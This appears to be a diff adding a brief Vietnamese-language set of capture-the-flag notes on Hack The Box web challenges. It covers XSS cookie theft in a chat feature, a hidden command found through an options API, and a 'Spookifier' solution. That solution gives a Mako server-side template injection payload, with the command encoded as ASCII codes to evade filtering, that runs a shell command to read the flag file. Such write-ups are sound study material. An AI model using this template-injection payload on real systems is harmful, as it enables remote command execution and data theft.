@@ -1,0 +1,92 @@
+only hacks
+  =>( xss lead to get user-cookie => chiem quyen dieu khien acc )
+  o trong chat section 
+  (vi vo tinh k filter user input trong qua trinh in lai ra lich su tro chuyen)
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________
+flag command:
+  + ta thay command cua nguoi dung se dc gui den /api/monitor va se tra ve response (co the tra ve flag neu command hop ly)
+  
+     if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
+          await fetch('/api/monitor', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ 'command': currentCommand })
+          })
+              .then((res) => res.json())
+              .then(async (data) => {
+                  console.log(data)
+                  await displayLineInTerminal({ text: data.message });
+  
+                  if(data.message.includes('Game over')) {
+                      playerLost();
+                      fetchingResponse = false;
+                      return;
+                  }
+  
+                  if(data.message.includes('HTB{')) {
+                      playerWon();
+                      fetchingResponse = false;
+  
+                      return;
+  
+  + ta lai thay web gui request den /api/options de lay danh sach cac command hop le
+  
+  const fetchOptions = () => {
+      fetch('/api/options')
+          .then((data) => data.json())
+          .then((res) => {
+              availableOptions = res.allPossibleCommands;
+  
+          })
+          .catch(() => {
+              availableOptions = undefined;
+          })
+  }
+  
+  + ta to mo muon biet them ve cac lua chon nen thu truy cap vao api chua cac option thi thay no co 1 command an , thu command ay thi ta co flag
+  
+  {
+    "allPossibleCommands": {
+      "1": [
+        "HEAD NORTH",
+        "HEAD WEST",
+        "HEAD EAST",
+        "HEAD SOUTH"
+      ],
+      "2": [
+        "GO DEEPER INTO THE FOREST",
+        "FOLLOW A MYSTERIOUS PATH",
+        "CLIMB A TREE",
+        "TURN BACK"
+      ],
+      "3": [
+        "EXPLORE A CAVE",
+        "CROSS A RICKETY BRIDGE",
+        "FOLLOW A GLOWING BUTTERFLY",
+        "SET UP CAMP"
+      ],
+      "4": [
+        "ENTER A MAGICAL PORTAL",
+        "SWIM ACROSS A MYSTERIOUS LAKE",
+        "FOLLOW A SINGING SQUIRREL",
+        "BUILD A RAFT AND SAIL DOWNSTREAM"
+      ],
+      "secret": [
+        "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
+      ]
+    }
+  }
+  nhap "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack" thi ta co flag
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________
+Spookifier
+  nhan thay code viet == python + thu ${7*7} duoc nen ta co the suy luan ra la ssti cho python
+  su dung payloads de rce:
+  
+  <%import os%>${os.popen(str().join(chr(i)for(i)in[99, 100, 32, 47, 59, 99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116])).read()}
+  voi 99 100 32 , la cac ki tu ascii dc ma hoa thanh so vi khi dua vao server-side lai k xu ly dc nh ki tu nhu la " ' -
+  
+  source: https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+
+
